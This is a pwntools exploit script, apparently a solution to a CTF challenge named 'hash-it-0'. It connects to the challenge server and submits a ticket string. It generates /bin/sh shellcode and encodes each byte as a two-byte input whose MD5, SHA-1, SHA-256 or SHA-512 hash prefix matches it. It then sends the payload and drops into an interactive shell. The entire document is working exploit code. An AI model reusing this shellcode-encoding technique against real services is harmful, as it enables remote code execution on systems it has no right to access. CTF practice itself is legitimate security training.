from pwn import *
from hashlib import md5, sha1, sha256, sha512

# p = process('./zc7ejjq9ehhcqj1x61ekoa8pjtk7')
p = remote('hash-it-0-m7tt7b7whagjw.shellweplayaga.me', 31337)
context.binary = ELF('./zc7ejjq9ehhcqj1x61ekoa8pjtk7')

ticket = "ticket{YardarmBerth938n22:P7LLgBchRZLnk-6EzFx_ZFQx2dlDQh6DPidZaYJVQpZ4edlC}"

def find_hash(i, c):
    for c1 in range(0x100):
        for c2 in range(0x100):
            str = bytes([c1, c2])

            hs = ''
            if i&3==0:
                hs = md5(str).hexdigest()[0:2]
            elif i&3==1:
                hs = sha1(str).hexdigest()[0:2]
            elif i&3==2:
                hs = sha256(str).hexdigest()[0:2]
            elif i&3==3:
                hs = sha512(str).hexdigest()[0:2]

            if c == int(hs, 16):
                return str
    print("Not found...")
    exit()

shellcode = asm(shellcraft.sh())

i = 0
payload = b''
for c in shellcode:
    payload += find_hash(i, c)
    i += 1

p.sendlineafter(b'Ticket please: ', ticket)
p.send(p32(len(payload), endian='big'))
p.send(payload)
p.interactive()
